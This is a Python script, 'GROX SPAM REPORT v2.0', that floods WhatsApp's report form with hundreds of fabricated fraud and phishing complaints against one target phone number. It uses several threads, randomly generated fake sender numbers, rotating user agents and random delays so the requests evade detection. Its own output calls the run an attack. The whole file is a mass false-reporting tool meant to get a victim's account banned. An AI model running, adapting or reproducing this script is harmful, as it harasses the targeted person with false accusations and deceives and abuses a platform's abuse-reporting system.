import requests
import time
import random
import threading
import os
from fake_useragent import UserAgent

TARGET = os.getenv("TARGET", "6281234567890")
TOTAL_REPORT = int(os.getenv("TOTAL_REPORT", "200"))
THREADS = int(os.getenv("THREADS", "5"))
DELAY_MIN = float(os.getenv("DELAY_MIN", "0.5"))
DELAY_MAX = float(os.getenv("DELAY_MAX", "1.5"))

SENDER_PREFIX = ["811","812","813","814","815","816","817","818","819",
                 "821","822","823","828","831","832","833","838","841",
                 "851","852","853","858","859","861","878","881","882",
                 "883","884","885","886","887","888","889","895","896",
                 "897","898","899"]

ua = UserAgent()

def generate_sender():
    prefix = random.choice(SENDER_PREFIX)
    suffix = ''.join([str(random.randint(0,9)) for _ in range(7)])
    return f"0{prefix}{suffix}"

def send_report(thread_id, results):
    success = 0
    failed = 0
    for i in range(TOTAL_REPORT // THREADS):
        sender = generate_sender()
        payload = {
            "phone": TARGET,
            "sender": sender,
            "report_type": "spam",
            "category": "fraud_phishing",
            "description": "Nomor ini mengirim spam massal dan penipuan.",
            "timestamp": int(time.time())
        }
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            r = requests.post("https://www.whatsapp.com/contact/report", 
                             data=payload, headers=headers, timeout=10)
            if r.status_code in [200, 201, 202, 204]:
                success += 1
                print(f"[T{thread_id}][{i+1}] ✓ {sender} -> {r.status_code}")
            else:
                failed += 1
                print(f"[T{thread_id}][{i+1}] ✗ {sender} -> {r.status_code}")
            time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
        except Exception as e:
            failed += 1
            print(f"[T{thread_id}][{i+1}] ❌ Error: {str(e)[:30]}")
    results[thread_id] = (success, failed)

def main():
    print("="*50)
    print("GROX SPAM REPORT v2.0 - RAILWAY EDITION")
    print("="*50)
    print(f"📱 TARGET      : {TARGET}")
    print(f"📊 TOTAL REPORT: {TOTAL_REPORT}")
    print(f"🧵 THREADS     : {THREADS}")
    print(f"⏱️  DELAY       : {DELAY_MIN}-{DELAY_MAX}s")
    print("="*50)
    print("🚀 Memulai serangan...\n")
    
    results = {}
    threads = []
    start_time = time.time()
    
    for t in range(THREADS):
        th = threading.Thread(target=send_report, args=(t, results))
        th.start()
        threads.append(th)
        time.sleep(0.1)
    
    for th in threads:
        th.join()
    
    total_success = sum(r[0] for r in results.values())
    total_failed = sum(r[1] for r in results.values())
    elapsed = time.time() - start_time
    
    print("\n" + "="*50)
    print("📊 HASIL AKHIR:")
    print(f"✅ SUKSES  : {total_success}")
    print(f"❌ GAGAL   : {total_failed}")
    print(f"📦 TOTAL   : {total_success + total_failed}")
    print(f"⏱️  WAKTU   : {elapsed:.2f} detik")
    print("="*50)
    print("🦊 GROX - TANPA FILTER | BY FANZZZ")

if __name__ == "__main__":
    main()